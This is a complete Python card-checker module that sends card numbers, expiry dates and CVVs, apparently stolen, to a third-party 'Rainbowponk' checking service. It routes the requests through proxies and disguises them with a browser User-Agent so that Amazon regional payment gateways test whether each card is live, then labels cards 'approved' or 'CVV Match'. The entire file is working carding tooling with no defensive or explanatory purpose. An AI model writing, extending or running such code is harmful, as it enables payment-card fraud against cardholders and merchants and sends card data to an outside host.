"""
Rainbowponk Amazon Multi-Region Gateway
Supports: AU, CA, MX, JP, IT
"""

import httpx
from typing import Optional, Dict, Any

LICENSE_KEY = "@MissNullMe"
BASE_URL = "https://rainbowponk.com"

AMAZON_APIS = {
    "au": "api/api_amazon_au.php",
    "ca": "api/api_amazon_ca.php",
    "mx": "api/api_amazon_mx.php",
    "jp": "api/api_amazon_jp.php",
    "it": "api/api_amazon_it.php",
}


async def rainbowponk_amazon_check(
    card: str,
    month: str,
    year: str,
    cvv: str,
    proxy: Optional[dict] = None,
    region: str = "au"
) -> Dict[str, Any]:
    """
    Check card using Rainbowponk Amazon regional APIs
    
    Args:
        card: Card number
        month: Expiry month
        year: Expiry year
        cvv: CVV code
        proxy: Optional proxy
        region: Amazon region (au, ca, mx, jp, it)
    """
    
    card_data = f"{card}|{month}|{year}|{cvv}"
    api_file = AMAZON_APIS.get(region.lower(), AMAZON_APIS["au"])
    
    url = f"{BASE_URL}/api/check"
    headers = {
        "Content-Type": "application/json",
        "Cookie": f"license_key={LICENSE_KEY}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    
    payload = {
        "lista": card_data,
        "gateway": api_file
    }
    
    try:
        async with httpx.AsyncClient(proxy=proxy, timeout=30.0, follow_redirects=True) as client:
            response = await client.post(url, json=payload, headers=headers)
            
            if response.status_code == 200:
                result = response.json()
                
                msg = str(result.get("message", "")).lower()
                
                if result.get("status") == "success" or "approved" in msg or "success" in msg:
                    return {
                        "status": "approved",
                        "message": result.get("message", "Payment Method Added"),
                        "card": card_data,
                        "region": region.upper(),
                        "gate": f"Rainbowponk Amazon {region.upper()}"
                    }
                elif "insufficient" in msg or "cvv" in msg:
                    return {
                        "status": "approved",
                        "message": "CVV Match",
                        "card": card_data,
                        "region": region.upper(),
                        "gate": f"Rainbowponk Amazon {region.upper()}"
                    }
                elif "declined" in msg or "invalid" in msg:
                    return {
                        "status": "declined",
                        "message": result.get("message", "Card Declined"),
                        "card": card_data,
                        "region": region.upper(),
                        "gate": f"Rainbowponk Amazon {region.upper()}"
                    }
                else:
                    return {
                        "status": "error",
                        "message": result.get("message", "Unknown response"),
                        "card": card_data,
                        "region": region.upper(),
                        "gate": f"Rainbowponk Amazon {region.upper()}"
                    }
            else:
                return {
                    "status": "error",
                    "message": f"HTTP {response.status_code}",
                    "card": card_data,
                    "gate": f"Amazon {region.upper()}"
                }
                
    except Exception as e:
        return {
            "status": "error",
            "message": f"Error: {str(e)[:100]}",
            "card": card_data,
            "gate": f"Amazon {region.upper()}"
        }


# Individual region functions
async def amazon_au_check(card: str, month: str, year: str, cvv: str, proxy: Optional[dict] = None):
    return await rainbowponk_amazon_check(card, month, year, cvv, proxy, "au")

async def amazon_ca_check(card: str, month: str, year: str, cvv: str, proxy: Optional[dict] = None):
    return await rainbowponk_amazon_check(card, month, year, cvv, proxy, "ca")

async def amazon_mx_check(card: str, month: str, year: str, cvv: str, proxy: Optional[dict] = None):
    return await rainbowponk_amazon_check(card, month, year, cvv, proxy, "mx")

async def amazon_jp_check(card: str, month: str, year: str, cvv: str, proxy: Optional[dict] = None):
    return await rainbowponk_amazon_check(card, month, year, cvv, proxy, "jp")

async def amazon_it_check(card: str, month: str, year: str, cvv: str, proxy: Optional[dict] = None):
    return await rainbowponk_amazon_check(card, month, year, cvv, proxy, "it")
